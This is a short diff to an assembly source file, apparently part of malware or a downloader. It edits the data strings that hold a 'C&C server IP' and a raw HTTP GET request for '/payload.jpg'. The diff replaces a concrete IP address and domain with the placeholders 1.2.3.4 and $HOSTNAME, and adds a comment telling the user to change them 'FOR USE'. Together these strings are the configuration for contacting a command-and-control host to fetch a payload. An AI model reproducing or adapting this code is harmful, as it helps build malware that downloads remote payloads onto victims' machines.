@@ -44,8 +44,8 @@ Section .data; initialized data
 				 printformat db "%s",0
 				 
 								
-				 Ipaddrstr 		db "73.65.151.30",0 ; C&C server IP
-				 GetString 		db "GET /payload.jpg HTTP/1.1",0x0d,0x0a,"Host: reverseuplink.com",0x0d,0x0a,"Connection: close",0x0d,0x0a,0x0d,0xa,00,00
+				 Ipaddrstr 		db "1.2.3.4",0 ; C&C server IP ; CHANGE IP AND HOSTNAME FOR USE!!!
+				 GetString 		db "GET /payload.jpg HTTP/1.1",0x0d,0x0a,"Host: $HOSTNAME",0x0d,0x0a,"Connection: close",0x0d,0x0a,0x0d,0xa,00,00
 
 
 
